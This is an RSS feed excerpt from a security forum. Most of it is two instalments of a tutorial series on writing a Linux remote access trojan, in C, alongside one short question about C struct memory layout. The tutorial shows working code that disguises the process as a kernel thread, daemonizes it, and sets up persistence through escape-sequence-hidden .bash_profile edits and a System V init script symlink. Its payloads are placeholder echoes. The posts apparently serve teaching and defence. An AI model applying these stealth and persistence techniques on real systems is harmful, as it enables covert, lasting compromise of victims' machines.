<li>Using virus. A virus containing actually the RAT could be used to infect binaries in the system so, whenever such a binary is executed the RAT gets also executed. Compare this to the modification of the bash start-up file where we had to modify a file, try to hide the modification and then provide a wrapper script to do our thing. In case there is some binary owned by the user, we can just infect it with a virus that just launches the RAT</li>
<li>Ramdisk. A linux system boots into Grub who then selects a kernel to be loaded and passes some parameters to it. Depending on how this kernel is configured it may get the initial code to execute from a ramdisk, either embedded in the kernel itself or as a separate file. An attacker could modify the kernel or the ramdisk to include the RAT there and get it executed at the very beginning of the system boot… even before systemd or System V scripts get executed.</li>
<li>Network reinfection. We had already mentioned this when briefly talking about Duqu malware. In this case, a heavily networked environment is exploited to infect as many machines as possible in a way that, even when a machine is restarted, when it gets back on-line, at least one already infected machine is still running who will immediately infect any fresh machine just rebooted. This technique does not require storing any file in persistent storage… storage is actually a decentralised sharing network… done the hard way.</li>
</ul>
<h1>
<a name="our-rat-so-far-16" class="anchor" href="https://0x00sec.org#our-rat-so-far-16"></a>Our RAT so-far</h1>
<p>Enough theory, it is time to go on with our programming course. Let’s take the code from the previous instalment and just refactor it a little bit.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int daemonize ()  {
  pid_t pid;
  
  if ((pid = fork()) != 0) return 0;
  setsid(); // Remove TTY
  if ((pid = fork()) != 0) return 0;
  return 0;
}

int payload () {
  while (1) {
    // C2C communication loop
    usleep (1000);
  }
}

int main (int argc, char *argv[]) {
  printf ("This is RAT0X0 version 0.1\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  daemonize (); 
  
  payload ();
}
</code></pre>
<p>From the learning point of view, it does not make much sense to implement every single technique we discussed above, but it is useful to implement the low level function required to use those techniques and that way we will keep learning about programming and how the system works.</p>
<p>The first we are going to do is to add a function that would implement the privilege escalation. For the time being it won’t really do any privilege escalation, but will allow us to introduce a new system call <code>getuid</code>. It will look like this.</p>
<pre><code class="lang-auto">#define USER_PERSISTENCE 0
#define SYS_PERSISTENCE  1

int escalate () {
  if (getuid () == 0) return SYS_PERSISTENCE;
#if 0
  extract_info ();
  if (find_exploit ()) {
    // Fire your zero-days here
    apply_exploit (); // This will actually run the RAT
	exit (1);         // so we are done
  }
#endif
  return USER_PERSISTENCE;
}
</code></pre>
<p>First, I defined two constants just to improve the readability of the code. Then, the function just checks if the user id is 0 (that means <code>root</code>). If that is the case it returns <code>SYS_PERSISTENCE</code>, meaning that we can apply one of the system-wide persistence techniques, or it returns <code>USER_PERSISTENCE</code> indicating that we can only aim for user persistence techniques.</p>
<p>I had added a basic pseudo-code for what the function should do. First the malware needs to extract information about the system , then find a suitable exploit based on that information and finally apply the exploit. Applying a exploit will usually imply (and that is what the code assumes) that the malware will be executed again as root… Then, when the <code>escalate</code> function is called again in that new execution, it will report that system persistence can be done, and actually become persistent.</p>
<p>Note that, in general, the malware will come with a few exploits implemented on it. This basically means than the <code>extract_info</code> function does not really needs to perform a complete enumeration of the system. It just need to check if the system is vulnerable to the exploits it carries.</p>
<h1>
<a name="applying-user-and-system-persistence-17" class="anchor" href="https://0x00sec.org#applying-user-and-system-persistence-17"></a>Applying user and system persistence</h1>
<p>Now it is time update our <code>main</code> function. Let’s first take a look to the new <code>main</code>:</p>
<pre><code class="lang-auto">int main (int argc, char *argv[]) {
  int (*persistence[2])() = {persistence_user, persistence_root};

  printf ("This is RAT0X0 version 0.2\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  daemonize ();
  
  persistence [escalate ()]();
  payload ();
}
</code></pre>
<p>There are two new lines. The first one is one of those fancy C data types declarations that may look confusing at first glance. In case you get confused with a C declaration… always follow the rule: <em>Data types declarations are read inside out</em>.</p>
<pre><code class="lang-auto">int (*persistence[2])()

 persistence[2]         : Array of two elements named persistence
 (*persistence[2])      : Array of two pointers to functions
 int (*persistence[2])(): Array to two pointers to functions 
                            returning int, and getting no parameter

</code></pre>
<p>It wasn’t that hard after all, wasn’t it?. We will see the functions <code>persistence_user</code> and <code>persistence_system</code> a bit later.</p>
<p>So, back to the pointers to functions. They allow us to point them to any function in our program and execute it. Let’s see the second line we added to main:</p>
<pre><code class="lang-auto">persistence [escalate ()]();
</code></pre>
<p>As you may remember, <code>escalate</code> will return <code>0</code> or <code>1</code> to indicate whether we are regular users or we have administrator permissions. The expression above, will select the first or the second element in the array of functions, that is <code>persistence_user</code> or <code>persistence_root</code>, and execute it, that is what the parenthesis at the end does (actually execute the function pointed by the pointer). In this case we are not passing parameters to the function so the parenthesis are empty.</p>
<h1>
<a name="user-persistence-18" class="anchor" href="https://0x00sec.org#user-persistence-18"></a>User persistence</h1>
<p>Let’s start implementing the user persistence. Let’s implement the technique that modifies <code>.bash_profile</code>. The technique is not really important, what we are interested on is the code we need to write to interact with the files. This is something we haven’t done yet. Most of the techniques we described above just require us to add some text to a file, so that is what we are going to learn first.</p>
<p>The user persistence function will look like this:</p>
<pre><code class="lang-auto">int persistence_user () {
  if (is_modified ("./.bash_profile"))
    {
      append_str ("./.bash_profile", "echo \"I am some harmless malware\"\n");
      append_str ("./.bash_profile", "#\033[1A\033[2K\033[1A\n");
      append_str ("./.bash_profile", "PATH=$HOME/bin:$PATH\n");
      append_str ("./.bash_profile", "#\033[2K\033[1A\033[2K\010");
    }
  return 0;
}
</code></pre>
<p>We need two functions. The first one checks if the file has already been modified. We do not want to modify a file that was already modified, and make it grow bigger. The second just allows us to append a text string to the end of the file. You should recognise the strings we are appending.</p>
<p><em>NOTE: The echo in the first <code>append_str</code> call shall actually be a call to the malware itself.</em></p>
<h1>
<a name="checking-for-modifications-19" class="anchor" href="https://0x00sec.org#checking-for-modifications-19"></a>Checking for modifications</h1>
<p>In order to verify that the file we want to modify has not yet being modified, we are going to use a very simple test. We will just look for a control ASCII code in the file that you won’t usually find on a shell script. I have chosen <code>\010</code> (<em>Data Line Escape</em>). Can you spot it at the end of the <code>persistent_user</code> function?. We could use the ESC character <code>\033</code> but it may be that the script uses itself escape sequences for colouring some data.</p>
<p>In order to do our check we need to do the following:</p>
<ul>
<li>Open the file</li>
<li>Read the whole file looking for our mark</li>
<li>Close the file</li>
</ul>
<p>All file operations works like that. You always need to open the file and get a file descriptor. That is the number that will allow you to do things with the file. When you are done, you need to close the file identified by the file descriptor you got when you opened it.</p>
<p>Not closing the file has two main consequences:</p>
<ul>
<li>First one is that the file descriptor is blocked. In this application it doesn’t really matter, but in applications intended to work with thousands of files (or network connections… they are also identified with file descriptors) you may run out of file descriptors and get your application blocked. By default GNU/Linux limits the number of file descriptors a process can open simultaneously to 1024.</li>
<li>Second, if you are writing to the file, in general, those changes won’t be visible until you close the file (or alternatively you flush the buffers that is one of the things happening when closing a file).</li>
</ul>
<p><em>Note:Nowadays, files get closed automatically by the system when an applications ends… that was not always the case.</em></p>
<p>With all this information, let’s write our check function:</p>
<pre><code class="lang-auto">unsigned char is_updated (char *fname) {
  unsigned char buffer, res = 1;
  int len, fd = open (fname, O_RDONLY);
  do {
       if ((len = read (fd, &amp;buffer, 1)) &lt;= 0) break;
       if (buffer == '\010') {
	     printf ("- File %s already infected\n", fname);
		 res = 0;
	     break;
       }
     } while (1);
  close (fd);
  return res;
}
</code></pre>
<p>The first line declares our file descriptor (it is just an integer) and opens the file calling the <code>open</code> system call. This system call expects the name of the file as first parameter, and some flags. In this case, we are opening the file for reading (so, no issue flushing buffers).</p>
<p>Then, we go into an loop to read each byte in the file one by one using our well-known <code>read</code> syscall. The loop is pretty straightforward. If <code>read</code> returns a negative number (an error) or 0 (we reach the end of the file) we leave the loop, otherwise we keep reading until we find our mark.</p>
<p>Then we just close the file and return an indication of the result of the operation (0 modified, 1 not modified).</p>
<h1>
<a name="system-buffers-20" class="anchor" href="https://0x00sec.org#system-buffers-20"></a>System buffers</h1>
<p>You may have heard that it is more efficient to read files in blocks, and that is true, so you may be wondering why I wrote the function reading the file byte by byte. Well, the reason is that the code is a bit simpler and therefore more convenient for our didactic purpose. Anyhow, in this case the difference is not that much. Let’s see why.</p>
<p>A disk doesn’t stores single bytes on its surface, instead, they read and write information in blocks. The original magnetic disks were organised in <a href="https://en.wikipedia.org/wiki/Disk_sector" rel="noopener nofollow ugc">sectors</a> that traditionally had a size of 512 bytes. The disk was reading an writing in blocks of at least that size, and that was a physical constraint at the beginning because the disk has to actually spin to get the right position under the head (the device that actually reads and writes the data), and doing that for just one byte was not very efficient… Actually, as the disk was spinning, usually several consecutive sectors going down the head were read (all at the same distance from the centre)… that was usually known as a cluster (that were contained within the track… the whole ring at that distance). So, you can read a whole track if you read all the sectors for a complete disk spin.</p>
<p>Furthermore, storage devices use DMA (Direct Memory Access) for its data transfer. When you transfer data from the computer memory to/from a peripheral (a disk, for instance), you can do two things.</p>
<p>First, you write some code that writes the data you want to transfer into the peripheral (or reads from it). This is done either, using Input/Ouput instruction (i.e. <code>in/out</code> assembly instructions) or writing to specific memory regions mapped to the device. The use of one or other technique is a hardware-level decision (depends how the peripheral is hooked to the bus). In either case, the CPU has to get a word from memory and put it to the peripheral. The word is actually twice in the bus (from memory to CPU and from CPU to peripheral).</p>
<p>The second option uses DMA. In this case peripherals can directly access the memory without involving the CPU (either for read or write). DMA has different modes but in general it uses data blocks and not bytes (or words) for the transfer. Specifically disks use DMA to interchange data as part of the overall Input/Output management performed by the OS.</p>
<p>So, this is why it is better to work on buffers than on bytes. Said that, what really happens is that the operating system already knows all these details and it does the buffering for us (actually we don’t have much control on any of these things from user space).</p>
<p>When we ask the kernel to read a single byte from a file, it will actually read the whole sector (and likely consecutive ones) that contains that byte and just return us the byte we asked for. When we ask for the next byte in the file, the kernel knows that the associated sector is already cached in memory and will return the byte immediately without asking the hard drive to read again the sector.</p>
<p>However, note that the process above involves the transfer of one byte from kernel space to user space many times, which will actually introduce an overhead that may be mitigated reducing the number of transfers required (transferring buffers instead of bytes).</p>
<p>Anyhow, in this example the difference is not that big, but I’ll show you the code for that case, for the sake of completeness.</p>
<pre><code class="lang-auto">unsigned char is_updated (char *fname) {
  unsigned char buffer [1024];
  int len, i, res = 1, fd = open (fname, O_RDONLY);
  do {
    if ((len = read (fd, buffer, 1024)) &lt;= 0) break;
    for (i = 0; i &lt; len; i++)
      if (buffer[i] == '\010') {
	    printf ("File %s already infected\n", fname);
	    res = 0;
		break;
      }

  } while (1);
  close (fd);
  return res;
}
</code></pre>
<p>The function is pretty much the same, we just need and extra loop to inspect the buffer.</p>
<h1>
<a name="appending-an-string-21" class="anchor" href="https://0x00sec.org#appending-an-string-21"></a>Appending an String</h1>
<p>To finish with our user persistence let’s write a simple function to append a string at the end of a file. This is actually easier than it may look as the operating system allows us to open files to <code>APPEND</code> data which is actually what we need.</p>
<p>This is how <code>append_str</code> looks like:</p>
<pre><code class="lang-auto">int append_str (char *fname, char *str) {
  int fd = open (fname, O_APPEND | O_WRONLY);
  write (fd, str, strlen (str));
  close (fd);
}
</code></pre>
<p>Nothing really special here. As we said, in order to interact with a file we need to open it and close it when we are done. In this case we are just writing the string passed as parameter. You surely notice the different flags used for <code>open</code> here. They are fully explanatory… we want to append and also to write (we are not interested on reading from the file).</p>
<h1>
<a name="persistence-root-22" class="anchor" href="https://0x00sec.org#persistence-root-22"></a>Persistence root</h1>
<p>For this case we are going to do the System V script modification. From a programming point of view there is no big difference as for all the other techniques we also need to create files or modify files, so it will be an interesting exercise for you to try to implement additional persistence solutions based on what we have learned here.</p>
<p>The code is once again very simple. Basic file manipulation with just a few tweaks that we will comment in a second.</p>
<pre><code class="lang-auto">char script[] =
  "#!/bin/bash\n"
  "echo \"I'm malware\"\n"
  "# Doing bad things here";

int persistence_root () {
  create_from_str ("./init.d/malware", '5', script);
  return 0;
}
</code></pre>
<p>We have just added the malware script as a string in our program… you may want to obfuscate it… but we will get to that later in this series.</p>
<p>Then the function to create the file and link it in the right <a href="https://en.wikipedia.org/wiki/Runlevel" rel="noopener nofollow ugc">runlevel</a> (we chose 5 in this case for multi user graphical).</p>
<pre><code class="lang-auto">int create_from_str (char *fname, char runlevel, char *str) {
  char target[1024] = "./rcX.d/S99malware";
  int fd = open (fname, O_CREAT | O_WRONLY, 0700);
  write (fd, str, strlen (str));
  close (fd);
  target[4] = runlevel;
  symlink (fname, target);
}
</code></pre>
<p>There are two main comments about this code:</p>
<ul>
<li>We are passing the <code>O_CREAT</code> flag to <code>open</code>. That will create the file in case it doesn’t exist. We have also used the third optional parameter that allows us to specify the permissions. In this case we want our script to be executable so we can save a later call to <code>chmod</code>.</li>
<li>The <code>symlink</code> system call just create a symbolic link… It works exactly the same than <code>ln -s origin target</code> in the command-line.</li>
</ul>
<p><em>NOTE:I’m creating all the files in my current development folder as I do not want to pollute my system and I’m being to lazy to setup some testing environment. Obviously, all path in the examples in this sections should start by <code>/etc/</code> and not by <code>./</code>.</em></p>
<h1>
<a name="running-the-malware-directly-23" class="anchor" href="https://0x00sec.org#running-the-malware-directly-23"></a>Running the malware directly</h1>
<p>The code in previous section was kind of general, I just wanted to show you how to create and populate a file, as you may also need that for the <code>systemd</code> case. In reality, you will want to run your malware directly and not just a script that eventually launches it.</p>
<p>In this case, supposing the malware is already in the place you want it (and no dropper or further manipulation is needed in order to run it) we just need to do the link. The code will then be something like this:</p>
<pre><code class="lang-auto">int persistence_root () {
  symlink ("/path_to_malware/malware", "./rc5.d/S99malware");
  return 0;
}
</code></pre>
<p>In this case, and assuming that we have chosen a fixed path to store the malware, we just need to create the symbolic link and we are done.</p>
<h1>
<a name="conclusions-24" class="anchor" href="https://0x00sec.org#conclusions-24"></a>Conclusions</h1>
<p>In this instalment we have explored some of the options to get programs executed at start time, which is the way malware achieve persistence… but it is also something that you usually need to do when setting up computer systems. In other words, that is a normal system administration task.</p>
<p>We have implemented simple user and a system wide persistence solution in order to introduce how to work with files (getting to know the <code>open</code> syscall) and how to create symbolic links.</p>
<p>The rest of techniques may require a little bit more of effort as they may require the execution of some system tools (using <code>system</code> or if you prefer <code>fork+execv</code>) or even more complex code. For instance, in order to interact programmatically with <code>systemd</code> we need to connect to <code>dbus</code> which will add a big library dependency on the malware. In that case, it is better to use <code>execv</code> and invoke the system tool. For the <code>crontab</code> case, we just need to append a line to <code>/var/spool/cron/crontabs/user</code>… but for that you need root or crontab access.</p>
<p>There are many other ways to get code executed automatically in a system… Share your favourite ones in the comments!</p>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wanabes-xii-persistence/26886">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wanabes-xii-persistence/26886</link>
          <pubDate>Sat, 21 Aug 2021 09:14:09 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26886</guid>
          <source url="https://0x00sec.org/t/programming-for-wanabes-xii-persistence/26886.rss">Programming for Wanabes XII. Persistence</source>
        </item>
        <item>
          <title>How is C Structure Layout in Memory</title>
          <dc:creator><![CDATA[n33ds0n]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I understand that array is a data structure that store collection of data of the same type in a contigous memory  and I also understand that structure is a user define data type that group element of the same or different kind into a single entity, but my question is how is structure handle in memory(structure layout in memory)</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-is-c-structure-layout-in-memory/26405">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-is-c-structure-layout-in-memory/26405</link>
          <pubDate>Thu, 24 Jun 2021 19:00:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26405</guid>
          <source url="https://0x00sec.org/t/how-is-c-structure-layout-in-memory/26405.rss">How is C Structure Layout in Memory</source>
        </item>
        <item>
          <title>Programming for Wanabes XI. Introduction to RATs</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>So my 0x00sec fellows’ve spoken and RATs will be. As anticipated in this first instalment we will mostly discuss theoretical concepts, which means not much code… but will be some :). Let’s start.</p>
<p>RAT stand for <strong>Remote Access Trojan</strong>, actually the last <code>T</code> could also be <em>Tool</em> instead of <em>Trojan</em> and then we will be talking about common tools used in corporate environments instead of malware. Conceptually both things do the same, i.e. allow a third party to remotely access and control a computer. Or if you prefer, they allow to break the privacy of people. The difference is that in some case there is some official and even legal support to install and run the tool and in the other… no. In any case, and most of the time, the users do not have a clue of what is going on <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> .</p>
<h1>
<a name="rats-functionality-1" class="anchor" href="https://0x00sec.org#rats-functionality-1"></a>RAT’s functionality</h1>
<p>The ultimate goal of a RAT is provide root shell access to the machine (or Administrator access if you prefer). Right, a <em>Backdoor</em> is, somehow, the simplest form of a RAT. It is true that many RATs provide specific functions like capturing video or audio, steal credentials, etc… however all these actions are pretty straight forward whenever you have privileged access to the machine. Or in other words, when you are able to upload and run any SW you want.</p>
<p>So, I will keep aside specific task to perform in the victim as the one mentioned above for the time being, and get focused on the actual core of the RAT: enabling remote access. For doing this, we need the following:</p>
<ul>
<li>Remote Shell Access (execute specific commands is a kind of subset of this)</li>
<li>Secure communication with a third party. That third-party will usually be a C2C application controlled by the attacker. This implies general data interchange (commands and responses but also file transfers in both directions)</li>
</ul>
<p>We will look into this again in the context of this course, but I have already written about this in <a href="https://0x00sec.org/t/remote-shells-part-i/269">here</a>, <a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306">here</a>, <a href="https://0x00sec.org/t/remote-shells-part-iii-shell-access-your-phone/508">here</a> and <a href="https://0x00sec.org/t/remote-shells-part-iv-the-invisible-remote-shell/743">here</a>…</p>
<p>On top of that, and I said on top, because what come next are orthogonal functions in the sense that they are used by many other types of malware and not specifically for RATs:</p>
<ul>
<li>Privilege Escalation.</li>
<li>Hiding</li>
<li>Network Pivoting (Optional)</li>
<li>Persistence (Optional)</li>
</ul>
<h2>
<a name="privilege-escalation-2" class="anchor" href="https://0x00sec.org#privilege-escalation-2"></a>Privilege Escalation</h2>
<p>This is a two-manifold topic. In one hand, it is common to have enumeration utilities available in the RAT infrastructure (either as part of the RAT or as a module that can be downloaded in the victim) to help the attacker get an administrator account.</p>
<p>Imagine that the RAT got executed using some Social Engineering technique. In such a case, it will likely be executed as an unprivileged user, and the attacker will try to escalate that situation in order to have full access to the machine.</p>
<p>On the other hand, the enumeration tools just provides the information about potential vulnerabilities in the machine. Then appropriated exploits are required in order to make those vulnerabilities into advantages to escalate user privileges.</p>
<p>Note that, some times the RAT gets executed already using a vulnerability (either local or remote) that gives it superuser privileges from time zero. In those cases the enumeration functions are just taking space and are not useful… Well, not exactly… What does this mean is that this kind of malware many times have a module/plug-in subsystem to enable the activation (and alternative download from the C2C) of functions when needed. Such a system in a malware context may be a bit complex, as sometimes you cannot just use standard functions provided by the system.</p>
<h2>
<a name="hiding-3" class="anchor" href="https://0x00sec.org#hiding-3"></a>Hiding</h2>
<p>Other function that most RAT implement is some kind of hiding capabilities. There are a few options on how to do this, depending on how secure is the target system.</p>
<ul>
<li>
<strong>Hide on-sight</strong>. On low-security systems sometimes it is just enough to give the RAT a cryptic-system-like name to make it invisible. Imagine the machine of a regular user that has just being compromised, for instance, to be used in a proxy chain or to become a zombie in a Botnet. You can just call your RAT something like <code>[kworker/u12:7]</code> and not even an advanced user may pay attention to it.</li>
<li>
<strong>Install a rootkit</strong>. Supposing the attacker has got root access to the machine s/he would easily install a rootkit to hide all tracks related to the RAT. Note that on a decently hardened machine kernel module loading would likely be disabled and run-time kernel patching may not be possible so maybe a user-space rootkit may be the only alternative.</li>
<li>
<strong>Insert the RAT in a running process</strong>. In this case, the RAT get itself copied in a running process and executed inside it, usually as a thread. This is a pretty stealth technique. For instance, imagine a Firefox that is already running, you will see firefox connections to many different server (supposing you have a hundred tab open as everybody does), together with the connection to the C2C machine. The basis of this is briefly described <a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166">here</a>. This technique also requires superuser permissions and makes persistence a bit tricky.</li>
</ul>
<h2>
<a name="network-pivoting-4" class="anchor" href="https://0x00sec.org#network-pivoting-4"></a>Network Pivoting</h2>
<p>This is an optional feature. It is common for RATs targeting cooperative environments where it is relatively easy (using social engineer for instance) to get into a machine with limited privileged from outside the network, and then reach internal machines, not accessible from the Internet, just jumping from different servers within the network. Sometimes the RAT offers a kind of proxy/router capability to connect the C2C to those internal machines.</p>
<p>Network pivoting can actually be seeing as a special case of privilege escalation, where the privileges are rising by accessing machines that may have access to services that other machines may not.</p>
<p>I bet all of you know what I’m talking about, but just in case. Imagine a web application. The front-end (all those pages and Javascripts) is accessible from the internet, but the back-end, the machine with the database and all the business logic is not, it only can be accessed from inside the target network.</p>
<p>As I said, network pivoting is a kind of systematic approach consisting on enumerating nearby computers accessible from the current compromised machine, determining any vulnerability or weak configuration, and then accessing it copying the RAT over and executing it there and effectively starting the process again from that machine.</p>
<p>Imagine for instance a machine in a corporate network. It has internet access, but the user also has access to some laboratory machines from that computer using SSH. Imagine that the user has configured ssh passwordless, what is pretty common specially when you need to access many machines remotely… Then we will have direct access to that machine for free…</p>
<h2>
<a name="persistence-5" class="anchor" href="https://0x00sec.org#persistence-5"></a>Persistence</h2>
<p>Finally, this functionality is also optional and depends on the nature of the attack. As mentioned before in this course, persistence is the capability of a malware to keep executing despite of being stopped for whatever reason (usually a reboot).</p>
<p>In general, a RAT will like to have some persistence mechanism, so the access to the machine is not lost after a reboot, or whenever the process dies for whatever reason. Persistence, usually implies writing something somewhere in the disk… because the disk is the memory on the computer that will survive reboots (if by a chance the target have other persistent storage, that would also be an option, think about flash memory in embedded platforms)… And not just that, further disk modifications are required in order to execute again that SW saved in that persistent memory.</p>
<p>Very advanced RAT targeting network environments, just act like a virus/worms. They have the capability to infect other machines so, after an initial attack enough machines in the network will be infected to ensure that after rebooting any of them, there will be some instance of the malware running in the network that will infect again that machine. This is a very smart and powerful technique as the attacker is not storing anything on the disk at the same time that it achieves persistence… Anyhow, as you can see, this will not work on all cases and it targets a very specific environment.</p>
<h1>
<a name="lets-write-a-rat-r4t0x0-6" class="anchor" href="https://0x00sec.org#lets-write-a-rat-r4t0x0-6"></a>Let’s write a RAT: r4t0x0</h1>
<p>Our first RAT is going to be damn simple, but it is going to be a complete/real RAT. Let’s go for the following:</p>
<ul>
<li>Hide on-sight</li>
<li>Basic Persistence</li>
<li>Remote shell</li>
</ul>
<p>If we recall our original malware skeleton, the two first features have to be implemented in the <code>init</code> function.</p>
<p><em>Note: In this instalment we will just drop the code on <code>main</code> as it will be just a few lines.</em></p>
<p>For persistence we will be going low profile, just store the file on the home folder of the user looking like a configuration file and silently patch <code>bash_profile</code> to launch it on each user session. A more sophisticated RAT could, for instance, determine the actual shell being used and patch the appropriate start-up files or look for a folder in the home directory containing many files so the RAT will be more stealth.</p>
<p>As I said we are going to keep it simple. The point of this exercise is that you understand how this works so, you will be able to extend the program to test any other technique you want to learn about or experiment with. Once you understand the basics you will be in the position to analyse different protection systems and start to try to figure out how to overcome… and then how to modify the protection system to detect you RAT, and then break it again,… and so forth. Lots of fun ahead.</p>
<p>Finally, the <code>remote shell</code> will be our main <code>payload</code>. In this case, as we mentioned in the <a href="https://0x00sec.org/t/programming-for-wannabes-part-vi-malware-introduction/">malware introduction</a>, RATs runs on an interactive loop, so there is no target selection function to feed the payload.</p>
<p>We will be going through the different features of the RAT one by one from scratch, so you will see a <em>possible</em> process on how to determine what is the issue you want to solve and how to solve it step by step until you reach your goal. As it happens with many other problems in real life, the key point is to get to know what is the problem you want to solve… this seems pretty trivial, but many times people lost the point and end up overcomplicating things that doesn’t really add to the solution of the problem. Anyhow, I hope the approach we are going to follow will help you not only to write malware or tools to detect malware, but to solve problems in general… That is the important thing to learn.</p>
<p>Let’s get started with the first point.</p>
<h1>
<a name="hiding-on-sight-7" class="anchor" href="https://0x00sec.org#hiding-on-sight-7"></a>Hiding on-sight</h1>
<p>Our goal here is to keep the RAT low profile and avoid it to be detected. As we discussed in the introduction sometimes just changing your name and being quiet will be more than enough to go unnoticed.</p>
<p>The easiest way is to give the process the name of some system thread. Not even an advanced user will be able to spot the RAT on <code>ps</code> or <code>top</code> at first (or any other tools actually). However… your program has to be properly coded and be efficient otherwise… seen something that looks like a system thread taking 100% of the CPU, and popping on top of <code>top</code> all the time… well, that will be suspicious. And then it is just a matter of time to get discovered.</p>
<p>Let’s see how all this works. We will be using <code>ps</code>, but most monitoring tools work the same, actually reading data from <code>/proc/PID</code>.</p>
<p>You can now run a <code>ps -ax</code> on your system an take a look to what you get. You can also install different distros on VMs and check differences between distros and kernels to chose a name that fits well in more platforms. These are some examples I get from an Ubuntu machine:</p>
<pre><code>   10 ?        S      0:00 [migration/0]
   13 ?        S      0:00 [cpuhp/1]
   14 ?        S      0:03 [watchdog/1]
   22 ?        S      0:04 [ksoftirqd/2]
   24 ?        I&lt;     0:00 [kworker/2:0H]
   46 ?        S      0:01 [ksoftirqd/6]
   48 ?        I&lt;     0:00 [kworker/6:0H]
  358 ?        S      0:27 [jbd2/sda5-8]
  991 ?        S      1:01 [jbd2/sda6-8]
 2189 ?        S      0:00 [nfsd]
 2190 ?        S      0:00 [nfsd]
 2191 ?        S      0:00 [nfsd]
</code></pre>
<p>There are many more options, just take a look on your own system.</p>
<p>User space programs are more susceptible to be noticed by the user/administrator, but, for instance in the example above, you can see a few threads of the kernel NFS server running… They all look the same, so it is likely that nobody will notice an extra line like those (except for the sequential PIDs)… However not everybody runs an NFS server… the <code>kworker</code> option sounds better but process status is <code>I</code>. That means it is a kernel <code>Idle</code> task that I believe is an state we cannot reach from user space… But I haven’t researched this. Let me know in the comments if you can get that.</p>
<p>The <code>jdb2</code> is the <em>Journaling Block Device</em> basically will be there whenever you use a file system with journaling capabilities like <code>ext3</code> or <code>ext4</code> common on GNU/Linux boxes. This appears with an <code>S</code> status that means, <em>Sleeping</em> and that is what our RAT will do most of the time, so, let’s go for this one.</p>
<p>We will change the process name, but we will also try to mimic the other columns values. A normal user will not notice those but a system administrator will and may find them suspicious, so we better are methodical. When we are done with this you will find a funny coincidence…</p>
<h2>
<a name="changing-a-process-name-8" class="anchor" href="https://0x00sec.org#changing-a-process-name-8"></a>Changing a process name</h2>
<p>Let’s first take a look to how does a normal process looks like. Let’s compile this simple program that just go into sleep mode waiting for some user input (that is what <code>getchar</code> does… gets a char):</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main (int argc, char *argv[]) {
  printf ("This is RAT0X0 version 0.1\n");
  getchar ();
}
</code></pre>
<p>Now, let’s compile and run it and on a different terminal let’s see how <code>ps</code> sees this simple process:</p>
<pre><code>$ ps -ax | grep rat
(...)
23022 pts/24   S+     0:00 ./rat0x0-01
</code></pre>
<p>That doesn’t look promising. We could already change the name to <code>jbd2SOMETHING</code> on the disk before running the program but that will be suspicious and unlikely to be executed by a user… We should assume that the program will have an arbitrary name.</p>
<p>The simplest way to change the name is to overwrite the <code>argv[0]</code> parameter that is actually the file name of the program being executed:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main (int argc, char *argv[]) {
  printf ("This is RAT0X0 version 0.1\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  getchar ();
}

</code></pre>
<blockquote>
<p>Note: In principle your target name shall have the same length or less than the original one so it will fit in the current assigned memory. Otherwise you will need to shuffle around the stack to make room for the extra characters…</p>
</blockquote>
<p>Let’s try:</p>
<pre><code>$ ps -ax | grep rat
(...)
23431 pts/39   S+     0:00 grep rat
</code></pre>
<p>No trace of <code>rat0x0</code>. Let’s see how this new <code>jbd2</code> looks like:</p>
<pre><code>$ ps -ax | grep bd2
   358 ?        S      0:27 [jbd2/sda5-8]
   991 ?        S      1:01 [jbd2/sda6-8]
 23371 pts/24   S+     0:00 [Jbd2/sda0-8]
</code></pre>
<p>I have just add a capital <code>J</code> to easily identify the process during development (you will have to kill it a few times). Note that <code>sda0</code> is not a valid partition name so it should be safe… alternatively you could also swap the <code>b</code> and the <code>d</code> in the name and use a valid partition name… Well, you can try different options to chose a name that will be unnoticeable, at least at first glance…</p>
<p>However note than, when people suspect that there is something doggy going on, they will start looking on the details and sooner than later this will be uncover… As I said this is the most simplistic way to hide your RAT. And it works as far as nothing suspicious happens.</p>
<p>Anyhow, our process still shows a PTY (that means it is associated to a terminal) and also there is a <code>+</code> after the <code>S</code> that indicated that it is in the foreground.</p>
<h1>
<a name="going-background-9" class="anchor" href="https://0x00sec.org#going-background-9"></a>Going background</h1>
<p>What comes next is basically the process you follow to code a classical daemon. Yes, no hacker/malware developer black magic… just good old system programming. When writing a daemon you need to disconnect the process of any terminal, session and process group so the process doesn’t get terminated unexpectedly. You do a couple things more, but that is the very minimum to become a `daemon Let’s go step by step.</p>
<p>First, let’s go background.</p>
<p>The way to achieve this is to <code>fork</code> and kill our parent. All this process management things always sounds funny when explained with words :). When we <code>fork</code>, we create a new process that is an exact copy of the original one. The only difference between the father and the child is that, after <code>fork</code> the PID of the child is returned to the father and 0 is returned to the child. Both process continuing execution in the line just after <code>fork</code> in the program. Usually the father process creates a child to do something and get some result, so it will have to eventually wait for the process to finish and for that it needs the PID (well, it is better to know it). The child doesn’t need that, and can get its PID at any time just calling <code>getpid()</code>. No it won’t know its parent.  Our powerful <code>rat0x0</code> will look like this now</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
